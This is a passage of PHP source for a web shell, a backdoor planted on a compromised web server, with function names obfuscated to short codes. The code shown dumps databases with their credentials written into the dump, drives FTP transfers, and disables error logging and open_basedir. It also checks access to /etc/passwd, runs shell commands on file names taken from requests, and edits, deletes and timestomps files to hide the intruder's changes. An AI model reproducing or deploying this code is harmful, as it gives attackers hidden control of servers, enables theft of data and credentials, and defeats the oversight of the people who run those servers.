case 'Oracle': $this->num_fields=@ocinumcols($this->res); break; } } function parse_fields($table){ if(!$this->query('SELECT * FROM `'.$table.'` LIMIT 0,1;')) return 0; return ($this->get_result() ? $this->num_fields : 0); } function count_rows($table){ $tmpcount=0; switch($this->db){ case 'MySQL': $this->query('SELECT COUNT(*) FROM `'.$table.'`;'); if(@is_resource($this->res)){ $tmp=@mysql_fetch_array($this->res); $tmpcount=$tmp[0]; } break; case 'MSSQL': break; case 'PostgreSQL': break; case 'Oracle': break; } return (@is_numeric($tmpcount)?$tmpcount:0); } function dump($table){ if(empty($table)) return 0; $this->dump=array(); $this->dump[0]='##'; $this->dump[1]='## ----------------------------------------------- '; $this->dump[2]='## Dump date : '.@date("d/m/Y H:i:s"); $this->dump[3]='## PHP shell : '.z8u(); $this->dump[4]='## ----------------------------------------------- '; $this->dump[5]='## SQL host  : '.$this->host.':'.$this->port; $this->dump[6]='## SQL user  : '.$this->user; $this->dump[7]='## SQL pass  : '.$this->pass; $this->dump[8]='## SQL db    : '.$this->base; $this->dump[9]='## SQL table : '.$table; $this->dump[10]='## ----------------------------------------------- '; switch($this->db){ case 'MySQL': $this->dump[0]='## MySQL dump'; if($this->query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0; if(!$this->get_result()) return 0; $this->dump[]=$this->rows[0]['Create Table']; $this->dump[]='## ----------------------------------------------- '; if($this->query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0; if(!$this->get_result()) return 0; for($i=0;$i<$this->num_rows;$i++){ foreach($this->rows[$i] as $k=>$v){ $this->rows[$i][$k]=@mysql_real_escape_string($v); } $this->dump[]='INSERT INTO `'.$table.'` (`'.@implode("`, `",$this->columns).'`) VALUES (\''.@implode("', '",$this->rows[$i]).'\');'; } break; case 'MSSQL': $this->dump[0]='## MSSQL dump'; if($this->query('SELECT * FROM '.$table)!=1) return 0; if(!$this->get_result()) return 0; for($i=0;$i<$this->num_rows;$i++){ foreach($this->rows[$i] as $k=>$v){ $this->rows[$i][$k]=@addslashes($v); } $this->dump[]='INSERT INTO '.$table.' ('.@implode(", ",$this->columns).') VALUES (\''.@implode("', '",$this->rows[$i]).'\');'; } break; case 'PostgreSQL': $this->dump[0]='## PostgreSQL dump'; if($this->query('SELECT * FROM '.$table)!=1) return 0; if(!$this->get_result()) return 0; for($i=0;$i<$this->num_rows;$i++){ foreach($this->rows[$i] as $k=>$v){ $this->rows[$i][$k]=@addslashes($v); } $this->dump[]='INSERT INTO '.$table.' ('.@implode(", ",$this->columns).') VALUES (\''.@implode("', '",$this->rows[$i]).'\');'; } break; case 'Oracle': $this->dump[0]='## ORACLE dump'; break; default: return 0; break; } return 1; } function close(){ switch($this->db){ case 'MySQL': @mysql_close($this->connection); break; case 'MSSQL': @mssql_close($this->connection); break; case 'PostgreSQL': @pg_close($this->connection); break; case 'Oracle': @oci_close($this->connection); break; } } function affected_rows(){ switch($this->db){ case 'MySQL': return @mysql_affected_rows($this->res); break; case 'MSSQL': return @mssql_affected_rows($this->res); break; case 'PostgreSQL': return @pg_affected_rows($this->res); break; case 'Oracle': return @ocirowcount($this->res); break; default: return 0; break; } } } class ftp { var $server=""; var $port=21; var $user=""; var $userDir=""; var $password=""; var $connection=""; var $passive=false; var $systype=""; var $mode=FTP_BINARY; var $loggedOn=false; var $downloadDir=""; function ftp($server,$port,$user,$password,$passive=false){ $this->server=$server; $this->port=$port; $this->user=$user; $this->password=$password; $this->connect(); $this->setPassive($passive); } function connect(){ $this->connection=@ftp_connect($this->server,$this->port); $this->loggedOn=@ftp_login($this->connection,$this->user,$this->password); $this->systype=@ftp_systype($this->connection); return; } function setPassive($passive){ $this->passive=$passive; @ftp_pasv($this->connection,$this->passive); return; } function setMode($mode=1){ $this->mode=$mode; return; } function setCurrentDir($dir=false){ if($dir) @ftp_chdir($this->connection,$dir); $this->currentDir=z1k(@ftp_pwd($this->connection)); return $this->currentDir; } function setDownloadDir($dir){ $this->downloadDir=$dir; return; } function chmod($p,$f){ return @ftp_site($this->connection,"chmod $p $f"); } function cd($dir){ if($dir==".."){ @ftp_cdup($this->connection); }else{ if(!@ftp_chdir($this->connection,$this->currentDir.$dir)){ @ftp_chdir($this->connection,$dir); } } $this->currentDir=z1k(@ftp_pwd($this->connection)); return; } function is_dir($dir) { if (@ftp_chdir($this->connection, $dir)) { @ftp_chdir($this->connection, '..'); return true; } else { return false; } } function get($file,$dest='',$t=0){ if($dest=='') $dest=$this->downloadDir; return @ftp_get($this->connection,($t?$dest:z1k($dest).z2l($file)),"$file",$this->mode); } function getRecursive($src,$dest=''){ if($dest=='') $dest=$this->downloadDir; $target=z2l($src); $src=z1k($src); $dest=z1k($dest).$target; if(!z4r($dest)) @mkdir($dest); $list=@ftp_nlist($this->connection,$src); for($x=0;$x<@count($list);$x++){ $o=z2l($list[$x]); if($o!='.' && $o!='..'){ if($this->is_dir($src.$o)){ $this->getRecursive($src.$o,$dest); }else{ $this->get($src.$o, $dest); } } } } function getObject($src, $dest=''){ if($dest=='') $dest=$this->downloadDir; if($this->is_dir($src)){ return $this->getRecursive(z1k($src), $dest); } else { return $this->get($src, $dest); } } function put($rf,$lf){ return (@file_exists($lf) ? @ftp_put($this->connection,$rf,$lf,$this->mode) : false); } function putRecursive($src,$dest=''){ if($dest=='') $dest=$this->currentDir; $target=z2l($src); $src=z1k($src); $dest=z1k($dest).$target; $this->makeDir($dest); $list=z8x($src); for($x=0; $x<@count($list); $x++){ $o=z2l($list[$x]); if($o!="."&&$o!=".."){ if(z4j($src.$o)){ $this->putRecursive($src.$o,$dest); }else{ $this->put(z1k($dest).$o,$src.$o); } } } } function putObject($src, $dest=''){ if($dest=='') $dest=$this->currentDir; $target=z2l($src); if(z4j($src)){ return $this->putRecursive($src, $dest); } else { return $this->put(z1k($dest).$target, $src); } } function deleteFile($rf){ return @ftp_delete($this->connection,"$rf"); } function deleteObject($obj){ $cobj=z2l($obj); if($cobj!='.'&&$cobj!='..'){ if($this->is_dir($obj)){ if($list=@ftp_nlist($this->connection,"$obj")){ for($x=0;$x<@count($list);$x++){ $o=z2l($list[$x]); if($o!='.'&&$o!='..'){ $this->deleteObject(z1k($obj).$o); } } } @ftp_rmdir($this->connection,"$obj"); }else{ $this->deleteFile("$obj"); } } } function rename($old,$new){ return @ftp_rename($this->connection,"$old","$new"); } function makeDir($dir){ return @ftp_mkdir($this->connection,"$dir"); } function parseline($raw) { if (@preg_match("/([-dl])([rwxsStT-]{9})[ ]+([0-9]+)[ ]+([^ ]+)[ ]+(.+)[ ]+([0-9]+)[ ]+([a-zA-Z]+[ ]+[0-9]+)[ ]+([0-9:]+)[ ]+(.*)/", $raw, $m)){ $l=array(($m[1]=='d'?'d':($m[1]=='l'?'l':'f')), $m[9], $m[6]); } elseif (@preg_match("/([-dl])([rwxsStT-]{9})[ ]+(.*)[ ]+([a-zA-Z0-9 ]+)[ ]+([0-9:]+)[ ]+(.*)/", $raw, $m)){ $l=array(($m[1]=='d'?'d':($m[1]=='l'?'l':'f')), $m[6], $m[3]); } elseif (@preg_match("/([0-9\\/-]+)[ ]+([0-9:AMP]+)[ ]+([0-9]*|<DIR>)[ ]+(.*)/", $raw, $m)){ $l=array(($m[3]=="<DIR>"?'d':'f'), $m[4], $m[3]); } elseif (@preg_match("/([-]|[d])[ ]+(.{10})[ ]+([^ ]+)[ ]+([0-9]*)[ ]+([a-zA-Z]*[ ]+[0-9]*)[ ]+([0-9:]*)[ ]+(.*)/", $raw, $m)){ $l=array(($m[1]=='d'?'d':'f'), $m[7], $m[4]); } elseif (@preg_match("/([a-zA-Z0-9_-]+)[ ]+([0-9]+)[ ]+([0-9\\/-]+)[ ]+([0-9:]+)[ ]+([a-zA-Z0-9_ -\*]+)[ \\/]+([^\\/]+)/", $raw, $m)){ $l=array(($m[5]=="*STMF"?'f':'d'), $m[6], $m[2]); } elseif (@preg_match("/([-dl])([rwxsStT-]{9})[ ]+([0-9]+)[ ]+([a-zA-Z0-9]+)[ ]+([a-zA-Z0-9]+)[ ]+([0-9]+)[ ]+([a-zA-Z]+[ ]+[0-9]+)[ ]+([0-9:]+)[ ](.*)/", $raw, $m)){ $l=array(($m[1]=='d'?'d':($m[1]=='l'?'l':'f')), $m[9], $m[6]); } else { $l=array(); } if (!@isset($l[1])||$l[1] == "." || $l[1] == ".." || @substr($raw,0,5) == "total") return array(); return $l; } function ftpRawList($dir=''){ if($dir=='') $dir=$this->currentDir; $files=array(); $list=@ftp_rawlist($this->connection,"-a ".$dir); if(@is_array($list)){ $i=0; foreach($list as $raw){ $line=$this->parseline($raw); if(@count($line)==3){ $files[$i]=$line; $i++; } } } return $files; } } if(@version_compare(@phpversion(),'4.1.0')==-1){ $_POST=&$HTTP_POST_VARS; $_GET=&$HTTP_GET_VARS; $_SERVER=&$HTTP_SERVER_VARS; $_COOKIE=&$HTTP_COOKIE_VARS; } if(@isset($_GET['act']) && $_GET['act']=="i"){ $img=$_GET['img']; if(!@isset($_GET['getall'])){ $img=@str_replace("~","",$img); foreach($index as $k=>$v){ if(@in_array($img,$v)){ $img=$k; break; } } if(@empty($images[$img])){ $img="small_unk"; if(@isset($_GET['exe'])&&$_GET['exe']) $img="cmd"; } $image=z9b($images[$img]); @ob_start(); $len=@strlen($image); @header("Cache-control: public"); @header("Expires: ".@date("r",@mktime(0,0,0,1,1,2030))); @header("Cache-control: max-age=".(60*60*24*7)); @header('Last-Modified: '.@date('r')); @header('Accept-Ranges: bytes'); @header('Content-Length: '.$len); @header('Content-type: image/png'); echo $image; @ob_end_flush(); }else{ z3z(); $r=''; foreach($index as $a=>$b){ foreach($b as $d){ if($a!=$d){ if(@isset($images[$d])&&!@empty($images[$d])){ $r.=z7u(z9c("Remove \$images[".$d."]")); } } } } if($r!='') echo z10w($r); @natsort($images); $k=@array_keys($images); $n=1; $r=''; foreach($k as $u) $r .= z7u(z9c(($n++)).z9c($u).z9c('<img alt="" src="?act=i&img='.$u.'" border="0">')); echo z10w($r); z3j(); } exit(); } if(@function_exists('error_reporting')){ @error_reporting(0); } if(@function_exists('ini_set')){ @ini_set('display_errors',0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('file_uploads',1); @ini_set('assert.quiet_eval',0); @ini_set('allow_url_fopen',1); @ini_set('memory_limit','256M'); @ini_set('upload_max_filesize','256M'); @ini_set('magic_quotes_sybase',0); @ini_set('magic_quotes_runtime',0); @ini_set('magic_quotes_gpc',0); @ini_set('open_basedir',NULL); }elseif(function_exists('ini_alter')){ @ini_alter('display_errors',0); @ini_alter('error_log',NULL); @ini_alter('log_errors',0); @ini_alter('file_uploads',1); @ini_alter('allow_url_fopen',1); @ini_alter('memory_limit','256M'); @ini_alter('upload_max_filesize','256M'); @ini_alter('magic_quotes_sybase',0); @ini_alter('magic_quotes_runtime',0); @ini_alter('magic_quotes_gpc',0); @ini_alter('open_basedir',NULL); } if(@function_exists('set_time_limit')){ @set_time_limit(0); } elseif(@function_exists('ini_set')){ @ini_set('max_execution_time',300); } elseif(function_exists('ini_alter')){ @ini_alter('max_execution_time',300); } @session_start(); @ob_start(); define("start",z10e()); if(@get_magic_quotes_gpc()){ if(@isset($_FILES)&&@count($_FILES)>0){ z3u($_FILES); } z4f($_POST); } if(@isset($_SESSION['tmps'])){ $tmps=$_SESSION['tmps']; } else { $tmps=z6j(); $_SESSION['tmps']=$tmps; } $tempdir=$tmps[0]; foreach($_POST as $postk=>$postv){ if(@substr($postk,0,6)=="backf_"){ $postk=@substr($postk,6); $postv=@urldecode($postv); } if($postk=='merged'){ $ar_merged=parse_str(base64_decode($postv)); if(@count($ar_merged)>0){ foreach($ar_merged as $kkey=>$kval){ if(!@isset(${$kkey})){ ${$kkey}=@urldecode($kval); } } } } else { if(!@isset(${$postk})){ ${$postk}=$postv; } } } foreach($_GET as $k=>$v){ if(!@isset(${$k})){ ${$k}=@urldecode($v); } } if(!@isset($act)) $act=z7z('2','default_act'); if($act=="logout") z4w(); z4g(); $win=$nix=$linux=0; $os=z9p(); if(@preg_match("/^win/i", $os)){ $win=1; } else { $nix=1; if(@preg_match("/linux/i",$os)) $linux=1; } $sh_exec=$safe_exec=0; $test_cmd=z9e("echo z_testexec"); if(@strpos($test_cmd,"exec")===6){ $sh_exec=1; } elseif ($nix && @preg_match('/successfully executed/', $test_cmd)){ $safe_exec=1; } $cuser=z5j(); $saddr=(@isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:(@isset($_SERVER['SERVER_NAME'])?$_SERVER['SERVER_NAME']:'127.0.0.1')); $yaddr=$_SERVER["REMOTE_ADDR"]; $bsafe=((!z7e('ini_get')||z8d('safe_mode')||!$sh_exec) ? 1 : 0); $bopendir=(@count(z9a(@ini_get('open_basedir')))>0 ? 1 : 0); $a_sql=array(); $bmysql=z7e("mysql_connect"); if($bmysql) $a_sql[]="MySQL"; $bmssql=z7e("mssql_connect"); if($bmssql) $a_sql[]="MsSQL"; $boracle=z7e("ocilogon"); if($boracle) $a_sql[]="Oracle"; $bpostgres=z7e("pg_connect"); if($bpostgres) $a_sql[]="PostgreSQL"; $bpasswd=0; if($nix){ if(z1y("/etc/passwd")) $bpasswd=1; } $bcurl=(@extension_loaded('curl')&&z7e("curl_init")); $bfsock=z7e("fsockopen"); $bftp=(z7e("ftp_connect")&&z7e("ftp_login")); $bmail=z7e("mail"); $bziparchive=(z7e("class_exists")&&@class_exists("ZipArchive")); $dtotal=$dused=$dfree='0B'; if($act=="d"){ if(@isset($dt)){ $dt=@trim($dt); if(!@empty($dt)){ switch($dt){ case 'new': if(!z4j($d)){ @mkdir($d); } $act="ls"; break; case 'chdir': if(@isset($tt)&&z4j($tt)){ $d=$tt; } $act="ls"; break; case 'rename': if(@isset($tt)&&z4j($tt)){ if(@isset($drename)&&$drename&&@isset($newname)&&!@empty($newname)){ if(z3a($newname)=='./'){ $newname=z3a($tt).z2l($newname); } elseif(!z4r(z3a($newname))){ $newname=z3a($tt).$newname; } if(z4r($newname)&&z4j($newname)){ $newname=z1k($newname).z2l($tt); } $rendirmsg= z3q((@rename($tt,$newname)?z9y("474",$newname):z9y("475",$tt)),'0'); } else { $showrename1=1; } } $act="ls"; break; case 'delete': if(z4r($tt)){ z8s($tt); } $act="ls"; break; case 'functions': if(@isset($tt)&&z4j($tt)){ $d=$tt; } $act="dfunc"; break; case 'bcopy': if(@isset($tt)&&z4j($tt)){ $abuf=$dt; } $act="ls"; break; case 'bcut': if(@isset($tt)&&z4j($tt)){ $abuf=$dt; } $act="ls"; break; case 'bpastecopy': $abuf=$dt; if(@isset($tt)&&z4j($tt)){ $d=$tt; } $act="ls"; break; case 'bpastecut': $abuf=$dt; if(@isset($tt)&&z4j($tt)){ $d=$tt; } $act="ls"; break; case 'bpasteall': $abuf=$dt; if(@isset($tt)&&z4j($tt)){ $d=$tt; } $act="ls"; break; default: break; } } } } if(!@isset($d)||@empty($d)){ $d=@realpath(@dirname('index.php')); z9n(); }elseif(@realpath($d)){ $d=@realpath($d); z9n(); }elseif(@isset($dold)&&@realpath(z1k($dold).$d)){ $d=@realpath(z1k($dold).$d); } if(@empty($d)) $d=@getcwd(); $d=z1k($d); @chdir($d); if(z7e('disk_free_space')&&z7e('disk_total_space')){ $free=@disk_free_space($d); $total=@disk_total_space($d); if($free===false) $free=0; if($total===false) $total=0; if($free<0) $free=0; if($total<0) $total=0; $dfree=@str_replace(" ","",z7x($free)); $dtotal=@str_replace(" ","",z7x($total)); $dused=@str_replace(" ","",z7x(($total-$free))); } $a_buf=array('bcopy','bcut'); $b_buf=array('bpastecopy','bpastecut','bpasteall'); if(!@isset($use_buffer)){ if(@isset($_SESSION['use_buffer'])){ $use_buffer=$_SESSION['use_buffer']; } else { $use_buffer=z7z('4'); } } else { $use_buffer = (bool)(int)$use_buffer; if(!$use_buffer) z0d(); } $_SESSION['use_buffer'] = $use_buffer; if($nix&&$sh_exec){ if(!@isset($cmd_tar)){ if(@isset($_SESSION['cmd_tar'])){ $cmd_tar=$_SESSION['cmd_tar']; } else { $cmd_tar=z8t("tar"); } } $_SESSION['cmd_tar']=$cmd_tar; if(!@isset($cmd_unrar)){ if(@isset($_SESSION['cmd_unrar'])){ $cmd_unrar=$_SESSION['cmd_unrar']; } else { $cmd_unrar=z8t("unrar"); } } $_SESSION['cmd_unrar']=$cmd_unrar; if(!@isset($cmd_unzip)){ if(@isset($_SESSION['cmd_unzip'])){ $cmd_unzip=$_SESSION['cmd_unzip']; } else { $cmd_unzip=z8t("unzip"); } } $_SESSION['cmd_unzip']=$cmd_unzip; if(!@isset($cmd_gunzip)){ if(@isset($_SESSION['cmd_gunzip'])){ $cmd_gunzip=$_SESSION['cmd_gunzip']; } else { $cmd_gunzip=z8t("gunzip"); } } $_SESSION['cmd_gunzip']=$cmd_gunzip; if(!@isset($cmd_bunzip2)){ if(@isset($_SESSION['cmd_bunzip2'])){ $cmd_bunzip2=$_SESSION['cmd_bunzip2']; } else { $cmd_bunzip2=z8t("bunzip2"); } } $_SESSION['cmd_bunzip2']=$cmd_bunzip2; if(!@isset($reg_archives)){ if(@isset($_SESSION['reg_archives'])){ $reg_archives=$_SESSION['reg_archives']; } else { $reg_archives=''; if(!@empty($cmd_unrar)) $reg_archives .= "rar|"; if(!@empty($cmd_unzip)) $reg_archives .= "zip|"; if(!@empty($cmd_tar)&&!@empty($cmd_gunzip)) $reg_archives .= "tar.gz|tgz|"; if(!@empty($cmd_tar)&&!@empty($cmd_bunzip2)) $reg_archives .= "tar.bz2|"; if(!@empty($cmd_tar)) $reg_archives .= "tar|"; if(!@empty($cmd_gunzip)) $reg_archives .= "gz|"; if(!@empty($cmd_bunzip2)) $reg_archives .= "bz2|"; if(!@empty($reg_archives)) $reg_archives=@substr($reg_archives,0,(@strlen($reg_archives)-1)); } } $_SESSION['reg_archives']=$reg_archives; } if($bziparchive){ if(!@isset($reg_archives)){ if(@isset($_SESSION['reg_archives'])){ $reg_archives=$_SESSION['reg_archives']; if(@empty($reg_archives)){ $reg_archives="zip"; } else { $r_e=@explode("|",$reg_archives); if(!@in_array("zip",$r_e)) $reg_archives .= "|zip"; } } else { $reg_archives='zip'; } } $_SESSION['reg_archives']=$reg_archives; } if(!@isset($color_skin)){ if(@isset($_SESSION['color_skin'])){ $color_skin=$_SESSION['color_skin']; } else { $color_skin=z7z('5','default_skin'); } } $_SESSION['color_skin'] = $color_skin; if(!@isset($use_images)){ if(@isset($_SESSION['use_images'])){ $use_images=$_SESSION['use_images']; } else { $use_images=z7z('5','images'); } } else { $use_images= (bool)(int)$use_images; } $_SESSION['use_images'] = $use_images; if($use_buffer){ if($act=="f"&&@in_array($ft,$a_buf)){ $act='ls'; $abuf=$ft; $f=$d.$f; } if(@isset($emptybuf) && $emptybuf) z0d(); z1d(); if(@isset($abuf) && @in_array($abuf,$a_buf)){ if(@isset($tt)) z1o($tt,$abuf); if(@isset($f)) z1o($f,$abuf); } elseif(@isset($abuf) && @in_array($abuf,$b_buf)){ switch($abuf){ case 'bpastecopy': if(@isset($bcopy)&&@is_array($bcopy)&&@count($bcopy)>0){ foreach($bcopy as $tcf){ if(z4r($tcf)) z8r($tcf, (z4j($tcf)? z1k($d).z2l($tcf): z1k($d))); } } break; case 'bpastecut': if(@isset($bcut)&&@is_array($bcut)&&@count($bcut)>0){ foreach($bcut as $tcf){ if(z4r($tcf)) z8p($tcf, z1k($d).(z4j($tcf)?z2l($tcf):'')); z1o($tcf,"bcut"); } } break; case 'bpasteall': if(@isset($bcopy)&&@is_array($bcopy)&&@count($bcopy)>0){ foreach($bcopy as $tcf){ if(z4r($tcf)) z8r($tcf, z1k($d).(z4j($tcf)?z2l($tcf):'')); } } if(@isset($bcut)&&@is_array($bcut)&&@count($bcut)>0){ foreach($bcut as $tcf){ if(z4r($tcf)) z8p($tcf, z1k($d).(z4j($tcf)?z2l($tcf):'')); z1o($tcf,"bcut"); } } break; default: break; } } z0j(); if(@isset($showbuf) && $showbuf){ $ls_a=@array_merge($bcopy,$bcut); } } z3z(); z3c(); z0p(); if($act=="f"&&@isset($ft)&&($ft=="extract"||$ft=="extractzip")){ $ff=''; if(z4r($d.$f)){ $ff=$d.$f; } elseif(z4r($f)) { $d=z3a($f); $f=z2l($f); $ff=$d.$f; } if(@isset($reg_archives)&&$reg_archives!=''&&@isset($ff)){ if(@preg_match('/\.('.$reg_archives.')$/i',$f,$m)){ if(@isset($m[1])){ if($ft=="extract"&&$sh_exec){ switch(@strtolower($m[1])){ case 'rar': z9e("unrar x $ff"); break; case 'zip': z9e("unzip $ff"); break; case 'tar.bz2': z9e("tar jxf $ff"); break; case 'tar.gz': z9e("tar zxf $ff"); break; case 'tgz': z9e("tar zxf $ff"); break; case 'tar': z9e("tar xf $ff"); break; case 'gz': z9e("gunzip $ff"); break; case 'bz2': z9e("bunzip2 $ff"); break; default: break; } } elseif($ft=="extractzip"){ echo z3q((z0m($ff,$d) ? z9y("476",$f):z9y("477",$f)),'0'); } } } } $act="ls"; } if(@isset($rendirmsg)&&!@empty($rendirmsg)) echo $rendirmsg; if(@isset($showrename1)&&$showrename1){ echo z3q(z5x(array("act"=>"d","d","dt"=>"rename","tt","drename"=>"1"),z10w(z7u(z6l(z7n(z9y("473",z2l($tt))).z5y("newname",$tt,"9").z8b(z9y("73"),"7"))),"2")),'0'); } if($act=="f"&&@isset($ft)&&$ft=="rename"&&@isset($f)&&!@empty($f)){ if(@isset($frename)&&$frename&&@isset($newname)&&!@empty($newname)){ if(z3a($newname)=='./'){ $newname=z3a($ff).z2l($newname); } elseif(!z4r(z3a($newname))){ $newname=z3a($ff).$newname; } if(z4r($newname)&&z4j($newname)){ $newname=z1k($newname).z2l($ff); } echo z3q((@rename($ff,$newname)?z9y("474",$newname):z9y("475",$ff)),'0'); } else { if(!isset($ff)){ if(z4r($d.$f)){ $ff=$d.$f; } elseif(z4r($f)){ $ff=$f; } } echo z3q(z5x(array("act"=>"f","f","d","ft"=>"rename","ff","frename"=>"1"),z10w(z7u(z6l(z7n(z9y("473",z2l($ff))).z5y("newname",$ff,"9").z8b(z9y("73"),"7"))),"2")),'0'); } $act="ls"; } elseif($act=="f"&&@isset($ft)&&$ft=="delete"&&@isset($f)&&!@empty($f)){ $ff=''; if(z4r($d.$f)){ $ff=$d.$f; } elseif(z4r($f)){ $ff=$f; } if(z4r($ff)) z8s($ff); $act="ls"; } if(($act=="dfunc"||$act=="f")&&((@isset($st1)&&$st1)||@isset($st2)&&$st2)){ if($act=="dfunc"){ $touch=$d; } else { $touch=$f; } if(@isset($st2)&&$st2&&!@empty($touch)&&z4r($touch)&&@isset($tmonth)&&!@empty($tmonth)&&@isset($tday)&&!@empty($tday)&&@isset($tyear)&&!@empty($tyear)&&@isset($thour)&&!@empty($thour)&&@isset($tmin)&&!@empty($tmin)&&@isset($tsec)&&!@empty($tsec)){ $sdate=$tday." ".$tmonth." ".$tyear." ".$thour." hours ".$tmin." minutes ".$tsec." seconds"; $tdate=@strtotime($sdate); if(@touch($touch,$tdate,$tdate)){ $tmsg=z9y("113",@date("M-d-Y H:i:s",$tdate)); }else{ $tmsg=z9y("114"); } } if(@isset($st1)&&$st1&&z4r($touch)&&@isset($copy_from)&&!@empty($copy_from)&&z4r($copy_from)){ if(@touch($touch,@filemtime($copy_from),@filemtime($copy_from))){ $tmsg=z9y("113",@date("M-d-Y H:i:s",@filemtime($copy_from))); }else{ $tmsg=z9y("114"); } } } if(@isset($chmod_submit)&&$chmod_submit&&@isset($ctarget)){ if(@isset($chmod_val)){ @chmod($ctarget,@octdec($chmod_val)); } else { $octet="0".@base_convert(($chmod_o["r"]?"1":"0").($chmod_o["w"]?"1":"0").($chmod_o["x"]?"1":"0").($chmod_g["r"]?"1":"0").($chmod_g["w"]?"1":"0").($chmod_g["x"]?"1":"0").($chmod_w["r"]?"1":"0").($chmod_w["w"]?"1":"0").($chmod_w["x"]?"1":"0"),2,8); @chmod($ctarget,@octdec($octet)); } if(z7e('clearstatcache')) @clearstatcache(); } z8n(); if($act=="dfunc"){ z2n(); z0c($d,0,1); if(z7e('touch')){ z3i(); echo z3q(z9y("124").z9x().z4y($d)); echo z10w( z5b(). (@isset($tmsg)&&!@empty($tmsg)?z7u(z5t(z9x()).z9c($tmsg)):''). z7u(z5x(array("act","d","st1"=>"1"),z5t(z9y("104")).z9c(z5y("copy_from","","9").z8b(z9y("112"),"7")))). z7u(z5x(array("act","d","st2"=>"1"),z5t(z9y("105")).z9c(z3m("tmonth",$tmonth_arr,"4",1)."-".z3m("tday",$tday_arr,"4",1)."-".z3m("tyear",$tyear_arr,"4",1).z9x(12).z3m("thour",$thour_arr,"1",1).":".z3m("tmin",$tmin_arr,"1",1).":".z3m("tsec",$tsec_arr,"1",1).z8b(z9y("112"),"7") ))). z5b() ,"2"); } } if($act=="f"&&@isset($ft)){ $ft=@trim($ft); if(@empty($ft)) $act="ls"; } if($act=="f"){ if(!@isset($f)) $f=''; if(!@isset($ft)) $ft=''; if(@isset($readfile)){ $d=z3a($readfile); $f=z2l($readfile); } elseif(@isset($writefile)){ $d=z3a($writefile); $f=z2l($writefile); } $fmsg=''; if(!z4e($d.$f)&&z4e($f)){ $d=z3a($f); $f=z2l($f); } elseif(z1k($f)==z1k($d)){ $f=''; $fmsg=z9y("472"); } elseif(z3a($f)==z1k($d)){ $f=z2l($f); } z2n(); if((!z4j($d.$f)&&z1y($d.$f))||(!z4r($d.$f)&&z0n($d)&&@isset($ft)&&$ft=="new")){ $ext=@strtolower(z2l($f,'.')); $rft=z4x($f); if(@preg_match("/sess_(.*)/",$f)){ $rft="sess"; } if(!@isset($ft)||@empty($ft)){ $ft=$rft; } if($ft=="new"){ z9t($d.$f,""); $ft="edit"; } if($ft=="rcown"){ $rcmsg=" ".(z2w($d.$f)?z5p(z9y("290")):z8k(z9y("291"))); $ft="code"; } if(@empty($ft)) $ft='functions'; echo z3q(z9y("78").z9x().($use_images?'<img src="?act=i&amp;img='.$ext.'"> ':'').z4y($d.$f." (".z7x(@filesize($d.$f)).")").(@isset($rcmsg)?$rcmsg:'')); z2q(); if(($ft!='functions'||($ft=='functions'&&@isset($submit_encode)))&&$ft!='ini') $r=z9o($d.$f); switch($ft){ case 'functions': echo z3q(z9y("90")); echo z6s(); $encode_functions=z1e(); echo z9m('2').z9k().z9v("d").z9v("act","f").z9v("f").z9v("ft","functions").z9v("submit_encode","1"). z7u(z5t(z9y("91")).z9c(z3m("encode_selected",$encode_functions,"0",1,'9').z8b(z9y("92"),'7'))).z9l(); $encoder_output=""; if(@isset($submit_encode)&&$submit_encode){ $encoder_output=$encode_selected($r); echo z9d(z5t(z9y("102")).z9c(z5w('','1').@htmlspecialchars($encoder_output).z5q())); } echo z10q(); echo z6s(); z0c($d.$f); if(z7e('touch')){ z3i(); echo z3q(z9y("103")); echo z10w( z5b(). (@isset($tmsg)&&!@empty($tmsg)?z7u(z5t(z9x()).z9c($tmsg)):''). z7u(z5x(array("act","d","f","ft"=>"functions","st1"=>"1"),z5t(z9y("104")).z9c(z5y("copy_from","","9").z8b(z9y("112"),"7")))). z7u(z5x(array("act","d","f","ft"=>"functions","st2"=>"1"),z5t(z9y("105")).z9c(z3m("tmonth",$tmonth_arr,"4",1)."-".z3m("tday",$tday_arr,"4",1)."-".z3m("tyear",$tyear_arr,"4",1).z9x(12).z3m("thour",$thour_arr,"1",1).":".z3m("tmin",$tmin_arr,"1",1).":".z3m("tsec",$tsec_arr,"1",1).z8b(z9y("112"),"7") ))). z5b() ,"2"); } break; case 'edit': $msg=""; if(@isset($save)&&$save){ $msg=(z9t($d.$f,$txtedit) ? z9y("243"):z9y("450")); $r=z9o($d.$f); } echo z5x(array("act"=>"f","d","f","ft"=>"edit","save"=>"1"),z10w(z9d(z6l(z5w('txtedit','2').@htmlspecialchars($r).z5q().z9z().z5z("left","3").z7n(z9y("115")).'<input type="text" id="replace_a" class="'.z4m('5','4').'">'.z9x(5).z7n(z9y("116")).'<input type="text" id="replace_b" class="'.z4m('5','4').'">'.z8m(z9y("117"),'fnc_replace(\'txtedit\',\'replace_a\',\'replace_b\');',"7").'<input type="reset" value="'.z9y("118").'" class="'.z4m('7','5').'">'.z8b(z9y("119"),"7").z9x().z7n($msg).z5h())),"2")); echo z6s(); break; case 'text': echo z10w(z9d(z6l('<pre>'.@htmlspecialchars($r).'</pre>')),'2'); break; case 'web': $url=z8u(); $url_a=@parse_url($url); if(@isset($url_a["host"])){ $host=$url_a["host"]; if(($wwwdir=z3n())!==false){ if(@strstr($d.$f,$wwwdir)!==false){ $link="http://".$host."/".@substr($d.$f, @strlen($wwwdir)); echo z10w(z9d(z6l('<iframe border="0" class="iframe" src="'.$link.'">'.z9y("471").'</iframe>')).z5b(),'2'); } } } break; case 'html': if(@isset($white)&&$white){ @ob_clean(); echo $r; @exit(); } else { echo z10w(z9d(z6l('<iframe border="0" class="iframe" src="?act=f&amp;f='.@urlencode($f).'&amp;d='.@urlencode($d).'&white=1&ft=html">'.z9y("471").'</iframe>')).z5b(),'2'); } break; case 'htmls': if(@isset($white)&&$white){ $r=@preg_replace('#\b(on(?<!\.on)[a-z]{2,20})\s*=\s*([\\\'"])?((?(2)(?(?<=")[^"]{1,1000}|[^\\\']{1,1000})|[^\s"\\\'>]{1,1000}))(?(2)\\2|)#i','',$r); $r=@preg_replace('#(<script[^>]*>.*?</script>|<[/]*noscript>|<meta\s(.*?)>)#is','',$r); $r=@preg_replace('#\b(href(?<!\.))\s*=\s*([\\\'"])?javascript:#i','href=\\2#javascript:',$r); @ob_clean(); echo $r; @exit(); } else { echo z10w(z9d(z6l('<iframe border="0" class="iframe" 